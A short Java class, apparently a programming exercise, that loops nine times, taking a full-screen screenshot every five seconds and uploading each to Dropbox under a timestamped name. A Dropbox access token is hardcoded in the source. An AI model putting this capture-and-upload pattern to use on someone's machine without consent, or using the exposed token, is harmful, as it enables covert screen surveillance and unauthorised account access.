import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.UploadErrorException;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.awt.image.DataBufferByte;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {

    public String ACCESS_TOKEN = "37HOaZpAa8AAAAAAAAAAERbYfs5vwHXNY8Qfz8f-8qH0snxc6tUUTqjgHWDS9nVE";

    public static String exercise_2(){
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_kkmmss \n");
        Date date = new Date();
        return dateFormat.format(date);
    }

    public static BufferedImage exercise_3() throws AWTException {
        Robot robot = new Robot();
        return robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
    }

    @Override
    public void run() {
        for (int i = 1; i<10; i++ ) {
            try {
                sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            try {
                BufferedImage image = exercise_3();
                ByteArrayOutputStream stream = new ByteArrayOutputStream(); //good
                ImageIO.write(image, "png", stream); //good
                InputStream in = new ByteArrayInputStream(stream.toByteArray());
                DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
                DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
                client.files().uploadBuilder("/" + exercise_2() + ".png").uploadAndFinish(in);
            } catch (IOException e) {
                e.printStackTrace();
            } catch (UploadErrorException e) {
                e.printStackTrace();
            } catch (DbxException e) {
                e.printStackTrace();
            } catch (AWTException e) {
                e.printStackTrace();
            }

        }

        super.run();
    }
}
